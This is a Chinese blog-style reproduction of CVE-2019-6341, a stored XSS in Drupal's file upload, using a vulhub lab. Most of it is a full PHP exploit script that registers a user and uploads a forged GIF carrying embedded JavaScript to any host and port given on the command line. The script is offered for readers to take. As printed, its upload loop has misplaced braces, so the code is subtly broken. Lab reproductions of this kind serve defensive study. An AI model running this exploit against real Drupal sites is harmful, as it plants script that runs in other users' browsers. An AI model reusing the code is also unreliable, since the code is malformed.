## **漏洞简介：**

Drupal诞生于2000年，是一个基于PHP语言编写的开发型CMF（内容管理框架）。在某些情况下，通过文件模块或者子系统上传恶意文件触发XSS漏洞。

## **威胁类型**

XSS

## **威胁等级**

中

## **漏洞编号**

CVE-2019-6341

## **受影响系统及应用版本**

在7.65之前的Drupal 7版本中； 8.6.13之前的Drupal 8.6版本; 8.5.14之前的Drupal 8.5版本。

## **漏洞复现：**

******使用vulhub环境**

******进入目录：root@kali:/vulhub/drupal/CVE-2019-6341**

******启动docker**

******启动环境**
**![](https://image.3001.net/images/20200808/1596895141.png!small)**

******访问0.0.1:8080**

******进行CMF的安装，选择数据库时用sqlite数据库**
**![](https://image.3001.net/images/20200808/1596895166.png!small)**

**![](https://image.3001.net/images/20200808/1596895179.png!small)**

![](https://image.3001.net/images/20200808/1596895187.png!small)

**环境搭建完成**

**1** **、**
**该漏洞需要利用drupal文件模块上传文件的漏洞，伪造一个图片文件，上传，文件的内容实际是一段HTML代码，内嵌JS，这样其他用户在访问这个链接时，就可能触发XSS漏洞。**

**Drupal** **的图片默认存储位置为
/sites/default/files/pictures//，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。**

**使用PoC上传构造好的伪造GIF文件，PoC参考thezdi/PoC的PoC。**

**如图，输入如下命令，即可使用PoC构造样本并完成上传功能，第一个参数为目标IP 第二个参数为目标端口。**

（为了不影响越读体验poc我放到最后，需要自取）

![](https://image.3001.net/images/20200808/1596895244.png!small)**上传poc成功！**

**访问：**
**[http://127.0.0.1:8080/sites/default/files/pictures/2020-05(传poc的日期](http://127.0.0.1:8080/sites/default/files/pictures/2020-05\()[)/_0](http://192.168.192.128:8080/sites/default/files/pictures/2020-05/_0)**

（火狐和chrome自带xss过滤功能，验证存在时可使用 Edge 浏览器或者 IE 浏览器。

访问的图片名称为_0的原因是因为 Drupal 的规则机制，具体原理见https://paper.seebug.org/897/

**![](https://image.3001.net/images/20200808/1596895354.png!small)****漏洞利用poc：**

    
    
    <?php
    
    /*
    
    usage: php poc.php <target-ip>
    
    Date: 1 March 2019
    
    Exploit Author: TrendyTofu
    
    Original Discoverer: Sam Thomas
    
    Version: <= Drupal 8.6.2
    
    Tested on: Drupal 8.6.2 Ubuntu 18.04 LTS x64 with ext4.
    
    Tested not wokring on: Drupal running on MacOS with APFS
    
    CVE : CVE-2019-6341
    
    Reference: https://www.zerodayinitiative.com/advisories/ZDI-19-291/
    
    */
    
     
    
    $host = $argv[1];
    
    $port = $argv[2];
    
     
    
    $pk =   "GET /user/register HTTP/1.1\r\n".
    
            "Host: ".$host."\r\n".
    
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".
    
            "Accept-Language: en-US,en;q=0.5\r\n".
    
            "Referer: http://".$host."/user/login\r\n".
    
            "Connection: close\r\n\r\n";
    
     
    
    $fp = fsockopen($host,$port,$e,$err,1);
    
    if (!$fp) {die("not connected");}
    
    fputs($fp,$pk);
    
    $out="";
    
    while (!feof($fp)){
    
      $out.=fread($fp,1);
    
    }
    
    fclose($fp);
    
     
    
    preg_match('/name="form_build_id" value="(.*)"/', $out, $match);
    
    $formid = $match[1];
    
    //var_dump($formid);
    
    //echo "form id is:". $formid;
    
    //echo $out."\n";
    
    sleep(1);
    
     
    
    $data =
    
    "Content-Type: multipart/form-data; boundary=---------------------------60928216114129559951791388325\r\n".
    
    "Connection: close\r\n".
    
    "\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"mail\"\r\n".
    
    "\r\n".
    
    "test324@example.com\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"name\"\r\n".
    
    "\r\n".
    
    "test2345\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"files[user_picture_0]\"; filename=\"xxx\xc0.gif\"\r\n".
    
    "Content-Type: image/gif\r\n".
    
    "\r\n".
    
    "GIF\r\n".
    
    "<HTML>\r\n".
    
    "       <HEAD>\r\n".
    
    "              <SCRIPT>alert(123);</SCRIPT>\r\n".
    
    "       </HEAD>\r\n".
    
    "       <BODY>\r\n".
    
    "       </BODY>\r\n".
    
    "</HTML>\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"user_picture[0][fids]\"\r\n".
    
    "\r\n".
    
    "\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"user_picture[0][display]\"\r\n".
    
    "\r\n".
    
    "1\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"form_build_id\"\r\n".
    
    "\r\n".
    
    //"form-KyXRvDVovOBjofviDPTw682MQ8Bf5es0PyF-AA2Buuk\r\n".
    
    $formid."\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"form_id\"\r\n".
    
    "\r\n".
    
    "user_register_form\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"contact\"\r\n".
    
    "\r\n".
    
    "1\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"timezone\"\r\n".
    
    "\r\n".
    
    "America/New_York\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"_triggering_element_name\"\r\n".
    
    "\r\n".
    
    "user_picture_0_upload_button\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"_triggering_element_value\"\r\n".
    
    "\r\n".
    
    "Upload\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"_drupal_ajax\"\r\n".
    
    "\r\n".
    
    "1\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"ajax_page_state[theme]\"\r\n".
    
    "\r\n".
    
    "bartik\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"ajax_page_state[theme_token]\"\r\n".
    
    "\r\n".
    
    "\r\n".
    
    "-----------------------------60928216114129559951791388325\r\n".
    
    "Content-Disposition: form-data; name=\"ajax_page_state[libraries]\"\r\n".
    
    "\r\n".
    
    "bartik/global-styling,classy/base,classy/messages,core/drupal.ajax,core/drupal.collapse,core/drupal.timezone,core/html5shiv,core/jquery.form,core/normalize,file/drupal.file,system/base\r\n".
    
    "-----------------------------60928216114129559951791388325--\r\n";
    
     
    
    $pk = "POST /user/register?element_parents=user_picture/widget/0&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\n".
    
            "Host: ".$host."\r\n".
    
            "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\r\n".
    
            "Accept: application/json, text/javascript, */*; q=0.01\r\n".
    
            "Accept-Language: en-US,en;q=0.5\r\n".
    
            "X-Requested-With: XMLHttpRequest\r\n".
    
            "Referer: http://" .$host. "/user/register\r\n".
    
            "Content-Length: ". strlen($data). "\r\n".
    
            $data;
    
    echo "uploading file, please wait...\n";
    
    for ($i =1; $i <= 2; $i++){
    
    $fp = fsockopen($host,$port,$e,$err,1);
    
    if (!$fp) {die("not connected");}
    
    fputs($fp,$pk);
    
    $out="";
    
    while (!feof($fp)){
    
      $out.=fread($fp,1);
    
     
    
    fclose($fp);
    
    // echo "Got ".$i."/2 500 errors\n";
    
    // echo $out."\n";
    
    sleep(1);
    
    }
    
    echo "please check /var/www/html/drupal/sites/default/files/pictures/YYYY-MM\n";
    
    ?>

## **2** **、修复建议**

**升级Drupal至最新版本**

